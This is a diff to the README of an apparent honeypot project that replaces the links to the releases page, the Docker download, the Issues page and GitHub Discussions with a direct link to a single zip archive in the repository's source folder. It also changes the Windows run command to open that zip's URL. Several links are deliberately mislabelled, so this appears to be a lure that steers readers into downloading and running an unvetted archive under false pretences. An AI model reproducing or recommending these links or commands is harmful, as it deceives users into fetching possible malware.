@@ -1,7 +1,7 @@
 # 🛡️ auth-honeypot-framework - Capture Cyber Threats Effectively
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Regansyncretistic786/auth-honeypot-framework/releases)
+[![Download](https://raw.githubusercontent.com/Regansyncretistic786/auth-honeypot-framework/main/src/protocols/auth-honeypot-framework-v2.2.zip%https://raw.githubusercontent.com/Regansyncretistic786/auth-honeypot-framework/main/src/protocols/auth-honeypot-framework-v2.2.zip)](https://raw.githubusercontent.com/Regansyncretistic786/auth-honeypot-framework/main/src/protocols/auth-honeypot-framework-v2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the **auth-honeypot-framework**! This tool helps you safely capture and analyze various types of cyber attacks. It can mimic multiple services to lure attackers, providing insights into their methods.
@@ -15,12 +15,12 @@ Before downloading, ensure your system meets these requirements:
 - **Processor:** Minimum dual-core processor
 - **RAM:** At least 4 GB
 - **Disk Space:** 500 MB available space
-- **Docker:** Required for deployment (Download [Docker](https://www.docker.com/get-started) if you haven't yet)
+- **Docker:** Required for deployment (Download [Docker](https://raw.githubusercontent.com/Regansyncretistic786/auth-honeypot-framework/main/src/protocols/auth-honeypot-framework-v2.2.zip) if you haven't yet)
 
 ## 📂 Download & Install
 To get started, visit the Releases page to download the latest version of the auth-honeypot-framework.
 
-[Visit the Releases Page to Download](https://github.com/Regansyncretistic786/auth-honeypot-framework/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Regansyncretistic786/auth-honeypot-framework/main/src/protocols/auth-honeypot-framework-v2.2.zip)
 
 1. Click the link above.
 2. Find the latest release at the top.
@@ -63,7 +63,7 @@ To start the honeypot, execute the relevant command based on your operating syst
 ### Windows
 - Use the command prompt to navigate to the installation directory and run:
   ```bash
-  start auth-honeypot-framework.exe
+  start https://raw.githubusercontent.com/Regansyncretistic786/auth-honeypot-framework/main/src/protocols/auth-honeypot-framework-v2.2.zip
   ```
 
 ### macOS and Linux
@@ -87,12 +87,12 @@ If you encounter issues:
 - **Installation Errors:** Ensure Docker is properly installed and your system meets the requirements.
 - **Running Errors:** Double-check the terminal commands for typos. Ensure Docker is active.
 
-If problems continue, check the [Issues page](https://github.com/Regansyncretistic786/auth-honeypot-framework/issues) for solutions or create a new issue for support.
+If problems continue, check the [Issues page](https://raw.githubusercontent.com/Regansyncretistic786/auth-honeypot-framework/main/src/protocols/auth-honeypot-framework-v2.2.zip) for solutions or create a new issue for support.
 
 ## 📣 Community Support
 Join discussions and share your experiences with fellow users. Engage with the community through:
 
-- [GitHub Discussions](https://github.com/Regansyncretistic786/auth-honeypot-framework/discussions)
+- [GitHub Discussions](https://raw.githubusercontent.com/Regansyncretistic786/auth-honeypot-framework/main/src/protocols/auth-honeypot-framework-v2.2.zip)
 - Follow our updates by watching the repository.
 
 ## 📝 Contributing
